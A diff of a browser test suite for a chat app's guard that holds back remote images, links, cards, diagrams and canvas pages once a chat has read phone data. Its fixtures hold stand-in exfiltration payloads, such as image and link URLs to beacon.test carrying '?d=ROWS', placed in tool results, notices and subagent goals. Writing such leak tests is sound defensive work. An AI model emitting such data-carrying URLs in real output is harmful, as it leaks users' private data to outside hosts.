@@ -212,7 +212,7 @@ module.exports = async t => {
     const card = name =>
       pg.evaluate(name => {
         const c = [...document.querySelectorAll('.tool')].find(x => x.querySelector('.tool-name')?.getAttribute('title') === name)
-        return c && { imgs: c.querySelectorAll('img, video, audio').length, links: c.querySelectorAll('a').length, text: c.innerText }
+        return c && { imgs: c.querySelectorAll('img, video, audio').length, holds: c.querySelectorAll('.remote-hold').length, links: c.querySelectorAll('a').length, text: c.innerText }
       }, name)
     await tool('phone_data', 'pdtool-1')
     await sleep(500)
@@ -225,7 +225,284 @@ module.exports = async t => {
     await sleep(500)
     await expandAll()
     const oth = await card('terminal')
-    check(oth && oth.imgs > 0 && oth.links > 0 && hits.length > 0, `phone data card: another tool's card still shows media and links (${JSON.stringify(oth && { imgs: oth.imgs, links: oth.links })}, ${hits.length} fetches)`)
+    // The chat has read phone data, so another tool's card (a URL in a terminal output) holds its media behind a tap too; its links stay (they ask first).
+    check(oth && oth.imgs === 0 && oth.holds > 0 && oth.links > 0 && hits.length === 0, `phone data card: another tool's card in this chat holds its media behind a tap, keeps its links, fetches nothing (${JSON.stringify(oth && { imgs: oth.imgs, holds: oth.holds, links: oth.links })}, ${hits.length} fetches)`)
+    await pg.close()
+  }
+  {
+    // A chat that has read phone data (a phone_data tool item, whatever its outcome): text the agent wrote can't load anything
+    // remote before a tap, and an address is shown in full before it opens. Every access mode, Full access included. A chat
+    // with no phone_data call is unchanged. Derived from the chat's items, so it comes back with a reload.
+    const hits = []
+    const setup = async sid => {
+      const pg = await browser.newPage({ viewport: { width: 375, height: 812 } })
+      await pg.addInitScript(sid => {
+        localStorage.setItem('hm.lastSession', JSON.stringify({ id: sid, profile: 'default' }))
+        window.__opened = []
+        window.open = u => (window.__opened.push(String(u)), null) // openExternal's browser path
+        window.__socks = []
+        const Orig = window.WebSocket
+        window.WebSocket = class extends Orig {
+          constructor(...a) {
+            super(...a)
+            window.__socks.push(this)
+          }
+        }
+      }, sid)
+      await pg.route(/^https?:\/\/beacon\.test\//, r => {
+        hits.push(r.request().url())
+        return r.fulfill({ status: 200, contentType: 'image/png', body: png })
+      })
+      await pg.goto(WEB + '/')
+      await pg.locator('.msg.assistant').first().waitFor({ timeout: 15000 })
+      await sleep(700)
+      return pg
+    }
+    const media = pg => pg.evaluate(() => ({ imgs: [...document.querySelectorAll('.msg.assistant img.media')].length, holds: [...document.querySelectorAll('.msg.assistant .remote-hold')].map(h => h.innerText) }))
+    const dialogText = pg => pg.locator('.dialog').innerText({ timeout: 3000 }).catch(() => null)
+    const opened = pg => pg.evaluate(() => window.__opened)
+
+    // control: no phone_data call -> exactly as before
+    hits.length = 0
+    let pg = await setup('s-pd-ctl')
+    let m = await media(pg)
+    check(m.imgs === 1 && m.holds.length === 0 && hits.some(h => h.includes('/p.png')), `phone data taint: a chat with no phone_data call loads its image as before (${JSON.stringify(m)}, ${hits.length} fetches)`)
+    await pg.locator('.msg.assistant a', { hasText: 'see more' }).click()
+    await sleep(300)
+    check((await pg.locator('.dialog').count()) === 0 && (await opened(pg)).length === 1 && (await opened(pg))[0].includes('/page?d=ROWS'), 'phone data taint: a link in a chat with no phone_data call opens at once')
+    await pg.locator('.hm-openui').last().getByRole('button', { name: 'Visit site' }).click({ timeout: 15000 })
+    await sleep(300)
+    check((await pg.locator('.dialog').count()) === 0 && (await opened(pg)).some(u => u.startsWith('https://beacon.test/card')), 'phone data taint: a card open_url in a chat with no phone_data call opens at once')
+
+    // taint appears while the items are already drawn: the image goes back behind a tap
+    await pg.evaluate(() => {
+      const s = window.__socks.filter(x => x.readyState === 1).pop()
+      const ev = (type, payload) => s.dispatchEvent(new MessageEvent('message', { data: JSON.stringify({ jsonrpc: '2.0', method: 'event', params: { type, session_id: 'rt-s-pd-ctl', payload } }) }))
+      ev('tool.start', { tool_id: 'pd-live', name: 'phone_data', args: { kind: 'sms' } })
+      ev('tool.complete', { tool_id: 'pd-live', name: 'phone_data', args: { kind: 'sms' }, duration_s: 0.1, result: 'x' })
+    })
+    await sleep(700)
+    m = await media(pg)
+    check(m.imgs === 0 && m.holds.length === 1, `phone data taint: a read that happens after the reply was drawn covers it too (${JSON.stringify(m)})`)
+    await pg.close()
+
+    // tainted: nothing before the tap
+    hits.length = 0
+    pg = await setup('s-pd')
+    m = await media(pg)
+    check(m.imgs === 0 && m.holds.length === 1 && /beacon\.test/.test(m.holds[0]) && /Tap to load/.test(m.holds[0]), `phone data taint: the image waits behind its host name and "Tap to load" (${JSON.stringify(m)})`)
+    check(hits.length === 0, `phone data taint: no network request before the tap (${JSON.stringify(hits)})`)
+    await pg.locator('.msg.assistant .remote-hold').click()
+    await sleep(700)
+    m = await media(pg)
+    check(m.imgs === 1 && hits.some(h => h.includes('/p.png?d=ROWS')), `phone data taint: it loads after the tap (${JSON.stringify(m)})`)
+
+    // links and cards show the address first
+    await pg.locator('.msg.assistant a', { hasText: 'see more' }).click()
+    const d1 = await dialogText(pg)
+    check(d1 && d1.includes('http://beacon.test/page?d=ROWS') && /Site: beacon\.test/.test(d1) && d1.includes('?d=ROWS'), `phone data taint: a link shows the full address, host and query first (${d1})`)
+    check((await opened(pg)).length === 0, 'phone data taint: and has opened nothing yet')
+    await pg.locator('.dialog').getByRole('button', { name: 'Cancel' }).click()
+    await sleep(300)
+    check((await opened(pg)).length === 0, 'phone data taint: Cancel opens nothing')
+    await pg.locator('.msg.assistant a', { hasText: 'see more' }).click()
+    await pg.locator('.dialog').getByRole('button', { name: 'Open' }).click()
+    await sleep(300)
+    check((await opened(pg)).length === 1 && (await opened(pg))[0] === 'http://beacon.test/page?d=ROWS', 'phone data taint: Open on the dialog opens it')
+    await pg.locator('.hm-openui').last().getByRole('button', { name: 'Visit site' }).click({ timeout: 15000 })
+    const d2 = await dialogText(pg)
+    check(d2 && d2.includes('https://beacon.test/card?d=ROWS') && (await opened(pg)).length === 1, `phone data taint: a card open_url shows the address first and opens nothing yet (${d2})`)
+    await pg.locator('.dialog').getByRole('button', { name: 'Cancel' }).click()
+    await sleep(300)
+
+    // a new load: derived from the items, so it comes back
+    hits.length = 0
+    await pg.reload()
+    await pg.locator('.msg.assistant').first().waitFor({ timeout: 15000 })
+    await sleep(900)
+    m = await media(pg)
+    check(m.imgs === 0 && m.holds.length === 1 && hits.length === 0, `phone data taint: survives a page reload (${JSON.stringify(m)}, ${hits.length} fetches)`)
+
+    // Full access (the app's /yolo) does not lift it
+    await pg.getByPlaceholder('Message Hermux').fill('/yolo on')
+    await pg.locator('.composer').getByRole('button', { name: 'Send' }).click()
+    await sleep(900)
+    m = await media(pg)
+    check(m.imgs === 0 && m.holds.length === 1 && hits.length === 0, `phone data taint: Full access still holds the image (${JSON.stringify(m)}, ${hits.length} fetches)`)
+    await pg.close()
+  }
+  {
+    // The routes that loaded with no tap, in a chat that has read phone data (the shell's own filter, RemoteGuard.java, is
+    // the enforcement and is Java: only compiled and unit-tested). Here: the page holds back card images, Mermaid image
+    // shapes and srcset, guards tool cards, notices, subagent text and the canvas, and reports its state to the shell.
+    const hits = []
+    const setup = async sid => {
+      const pg = await browser.newPage({ viewport: { width: 375, height: 812 } })
+      await pg.addInitScript(nativeShell)
+      await pg.addInitScript(sid => {
+        localStorage.setItem('hm.lastSession', JSON.stringify({ id: sid, profile: 'default' }))
+        window.__opened = []
+        window.open = u => (window.__opened.push(String(u)), null)
+        window.__sid = 'rt-' + sid
+        window.__remote = [] // the shell's side, stubbed: what the page told remoteBlock / remoteAllowOnce
+        Object.assign(window.HermesAndroid, {
+          remoteBlock: (key, on) => window.__remote.push({ block: on, key }),
+          remoteAllowOnce: (key, url) => window.__remote.push({ allow: url, key })
+        })
+        window.__socks = []
+        const Orig = window.WebSocket
+        window.WebSocket = class extends Orig {
+          constructor(...a) {
+            super(...a)
+            window.__socks.push(this)
+            this.addEventListener('message', e => {
+              try {
+                const m = JSON.parse(e.data)
+                if (m.params && m.params.session_id) window.__sid = m.params.session_id
+              } catch {
+                /* not JSON */
+              }
+            })
+          }
+        }
+      }, sid)
+      for (const scheme of ['http', 'https'])
+        await pg.route(`${scheme}://beacon.test/**`, r => {
+          hits.push(r.request().url())
+          return r.fulfill({ status: 200, contentType: 'image/png', body: png })
+        })
+      await pg.goto(WEB + '/')
+      await pg.locator('.msg.assistant').first().waitFor({ timeout: 15000 })
+      await sleep(1500)
+      return pg
+    }
+    const ev = (pg, list) =>
+      pg.evaluate(list => {
+        const s = window.__socks.filter(x => x.readyState === 1).pop()
+        const sid = window.__sid
+        for (const [type, payload] of list) s.dispatchEvent(new MessageEvent('message', { data: JSON.stringify({ jsonrpc: '2.0', method: 'event', params: { type, session_id: sid, payload } }) }))
+      }, list)
+    const expand = async pg => {
+      for (let k = 0; k < 3; k++) {
+        const runs = pg.locator('.tool-run[aria-expanded="false"]')
+        if (!(await runs.count())) break
+        await runs.first().click()
+        await sleep(200)
+      }
+      const heads = pg.locator('.tool-head')
+      for (let k = 0; k < (await heads.count()); k++) if ((await heads.nth(k).getAttribute('aria-expanded')) !== 'true') await heads.nth(k).click()
+      await sleep(700)
+    }
+    const remote = pg => pg.evaluate(() => window.__remote)
+    const cardImgs = pg => pg.evaluate(() => [...document.querySelectorAll('.hm-openui')].flatMap(h => [...(h.shadowRoot || h).querySelectorAll('img')].map(i => i.getAttribute('src') || '')))
+
+    // ── the card, Mermaid and srcset routes ──
+    hits.length = 0
+    let pg = await setup('s-pd-leaks')
+    let imgs = await cardImgs(pg)
+    check(imgs.every(s => !/beacon\.test/.test(s)) && hits.length === 0, `phone data leaks: a card's image components fetch nothing in this chat (${JSON.stringify(imgs)}, ${JSON.stringify(hits)})`)
+    check((await pg.locator('.warn-line', { hasText: 'Images from the web are held back' }).count()) === 1, 'phone data leaks: the card says its images are held back')
+    const mm = await pg.evaluate(() => [...document.querySelectorAll('.msg.assistant .codeblock-bar')].map(b => b.innerText).join('|') + '#' + document.querySelectorAll('.msg.assistant .mermaid-box').length)
+    check(/mermaid \(not drawn/.test(mm) && mm.endsWith('#0'), `phone data leaks: a Mermaid diagram with an image shape is shown as code (${mm})`)
+    const pic = await pg.evaluate(() => document.querySelectorAll('.msg.assistant picture, .msg.assistant source, .msg.assistant [srcset]').length)
+    check(pic === 0 && hits.length === 0, `phone data leaks: no picture, source or srcset is left in the reply (${pic}, ${JSON.stringify(hits)})`)
+    let rem = await remote(pg)
+    check(rem.length > 0 && rem.every(r => r.key === 'K') && rem[rem.length - 1].block === true, `phone data leaks: the page told the shell this chat has read phone data (${JSON.stringify(rem)})`)
+
+    // reload: the page reports again, and still nothing is fetched
+    hits.length = 0
+    await pg.reload()
+    await pg.locator('.msg.assistant').first().waitFor({ timeout: 15000 })
+    await sleep(1200)
+    rem = await remote(pg)
+    check(rem.some(r => r.block === true) && rem[rem.length - 1].block === true && hits.length === 0, `phone data leaks: after a reload the shell is told again, nothing is fetched (${JSON.stringify(rem)}, ${hits.length} fetches)`)
+
+    // ── tool card, notice, subagent text ──
+    await ev(pg, [
+      ['tool.start', { tool_id: 'rf-1', name: 'read_file', args: { path: '/a' } }],
+      ['tool.complete', { tool_id: 'rf-1', name: 'read_file', args: { path: '/a' }, duration_s: 0.1, result: 'saved http://beacon.test/tool.png?d=ROWS' }],
+      ['review.summary', { text: '![n](http://beacon.test/notice.png?d=ROWS)' }],
+      ['subagent.start', { subagent_id: 'sa1', goal: 'look at http://beacon.test/goal?d=ROWS', status: 'running' }]
+    ])
+    await sleep(500)
+    await expand(pg)
+    const spots = await pg.evaluate(() => ({
+      tool: [...document.querySelectorAll('.tool')].filter(c => c.querySelector('.tool-name')?.getAttribute('title') === 'read_file').map(c => [c.querySelectorAll('img').length, c.querySelectorAll('.remote-hold').length]),
+      notice: [document.querySelectorAll('.notice img').length, document.querySelectorAll('.notice .remote-hold').length]
+    }))
+    check(spots.tool.length === 1 && spots.tool[0][0] === 0 && spots.tool[0][1] === 1 && hits.length === 0, `phone data leaks: a tool card's media waits behind a tap (${JSON.stringify(spots.tool)}, ${JSON.stringify(hits)})`)
+    check(spots.notice[0] === 0 && spots.notice[1] === 1, `phone data leaks: a notice's image waits behind a tap (${JSON.stringify(spots.notice)})`)
+    await pg.locator('.sub-goal a').click()
+    const dlg = await pg.locator('.dialog').innerText({ timeout: 3000 }).catch(() => null)
+    check(dlg && dlg.includes('Site: beacon.test') && dlg.includes('?d=ROWS') && (await pg.evaluate(() => window.__opened)).length === 0, `phone data leaks: a link in a subagent's goal shows its address first (${dlg})`)
+    await pg.locator('.dialog').getByRole('button', { name: 'Cancel' }).click()
+
+    // the placeholder says when the address carries data, and its tap asks the shell to pass exactly that address
+    const hold = pg.locator('.notice .remote-hold')
+    const holdText = await hold.innerText()
+    check(/beacon\.test/.test(holdText) && /has data in the address/.test(holdText) && /Tap to load/.test(holdText), `phone data leaks: the placeholder shows the host and that the address carries data (${holdText})`)
+    await hold.click()
+    await sleep(600)
+    rem = await remote(pg)
+    check(rem.some(r => r.allow === 'http://beacon.test/notice.png?d=ROWS') && hits.some(h => h.includes('/notice.png?d=ROWS')), `phone data leaks: its tap passes exactly that address to the shell, then loads (${JSON.stringify(rem.filter(r => r.allow))})`)
+
+    // the canvas: a page there gets no network in this chat, even with the network switch on
+    await pg.getByRole('button', { name: 'Canvas' }).first().click()
+    await pg.locator('.canvas-panel').waitFor({ timeout: 5000 })
+    await pg.getByRole('button', { name: 'New document' }).first().click()
+    await pg.locator('.picker-opt, .set-row', { hasText: 'Web page' }).click()
+    await pg.locator('.dialog input').fill('Page')
+    await pg.locator('.dialog button', { hasText: 'Create' }).click()
+    await pg.locator('textarea.editor-text').waitFor({ timeout: 5000 })
+    await pg.locator('textarea.editor-text').fill('<img src="http://beacon.test/canvas.png?d=ROWS">')
+    await pg.locator('.canvas-toolbar .seg button', { hasText: 'Run' }).click()
+    await pg.locator('.canvas-tool[title="Allow the page to use the network"]').click()
+    await sleep(1000)
+    const csp = await pg.evaluate(() => [...document.querySelectorAll('iframe.html-frame')].map(f => /Content-Security-Policy/.test(f.getAttribute('srcdoc') || '')))
+    check(csp.length > 0 && csp.every(Boolean) && !hits.some(h => h.includes('/canvas.png')), `phone data leaks: a canvas page gets no network in this chat, even with the switch on (${JSON.stringify(csp)})`)
+    await pg.close()
+
+    // ── control: no phone_data call, all of it as before ──
+    hits.length = 0
+    pg = await setup('s-pd-leaks-ctl')
+    imgs = await cardImgs(pg)
+    check(imgs.some(s => /card-image\.png\?d=ROWS/.test(s)) && (await pg.locator('.warn-line', { hasText: 'held back' }).count()) === 0, `phone data leaks, control: a chat with no phone_data call shows its card's images (${JSON.stringify(imgs)})`)
+    const mm2 = await pg.evaluate(() => [...document.querySelectorAll('.msg.assistant .codeblock-bar')].map(b => b.innerText).join('|'))
+    check(!/not drawn: it names an image/.test(mm2), `phone data leaks, control: its Mermaid diagram is never held for this reason (${mm2})`)
+    rem = await remote(pg)
+    check(rem.length > 0 && rem.every(r => r.block === false), `phone data leaks, control: the shell is told it is not blocked (${JSON.stringify(rem)})`)
+    await ev(pg, [
+      ['tool.start', { tool_id: 'rf-1', name: 'read_file', args: { path: '/a' } }],
+      ['tool.complete', { tool_id: 'rf-1', name: 'read_file', args: { path: '/a' }, duration_s: 0.1, result: 'saved http://beacon.test/tool.png?d=ROWS' }],
+      ['review.summary', { text: '![n](http://beacon.test/notice.png?d=ROWS)' }],
+      ['subagent.start', { subagent_id: 'sa1', goal: 'look at http://beacon.test/goal?d=ROWS', status: 'running' }]
+    ])
+    await sleep(600)
+    await expand(pg)
+    const ctl = await pg.evaluate(() => ({ holds: document.querySelectorAll('.remote-hold').length, noticeImg: document.querySelectorAll('.notice img').length }))
+    check(ctl.holds === 0 && ctl.noticeImg === 1 && hits.some(h => h.includes('/tool.png')), `phone data leaks, control: a tool card and a notice load their images as before (${JSON.stringify(ctl)})`)
+    await pg.locator('.sub-goal a').click()
+    await sleep(300)
+    check((await pg.locator('.dialog').count()) === 0 && (await pg.evaluate(() => window.__opened)).some(u => u.includes('/goal?d=ROWS')), 'phone data leaks, control: a subagent goal link opens at once')
+    // a subagent that never named phone_data changes nothing; one whose own tool event names it makes the chat count
+    await ev(pg, [['subagent.tool', { subagent_id: 'sa1', tool_name: 'terminal', status: 'running' }]])
+    await sleep(400)
+    check((await pg.locator('.remote-hold').count()) === 0, 'phone data leaks, control: a subagent tool event for another tool changes nothing')
+    await ev(pg, [['subagent.tool', { subagent_id: 'sa1', tool_name: 'phone_data', status: 'running' }]])
+    await sleep(700)
+    const after = await pg.evaluate(() => ({ holds: document.querySelectorAll('.remote-hold').length, imgs: document.querySelectorAll('.msg.assistant img.media, .notice img').length }))
+    check(after.holds > 0 && after.imgs === 0, `phone data leaks: a subagent whose own tool event names phone_data makes the chat count (${JSON.stringify(after)})`)
+    rem = await remote(pg)
+    check(rem[rem.length - 1].block === true, `phone data leaks: the shell is told at that moment, the first phone_data call (${JSON.stringify(rem)})`)
+
+    // chat switch: untainted -> tainted -> untainted, the shell follows each time
+    await pg.evaluate(() => window.hermesOpenSession('s-pd'))
+    await sleep(1200)
+    const toTainted = (await remote(pg)).slice(-1)[0]
+    await pg.evaluate(() => window.hermesOpenSession('s-pd-ctl'))
+    await sleep(1200)
+    const toCtl = (await remote(pg)).slice(-1)[0]
+    check(toTainted.block === true && toCtl.block === false, `phone data leaks: switching chats tells the shell each time (${JSON.stringify([toTainted, toCtl])})`)
     await pg.close()
   }
 }
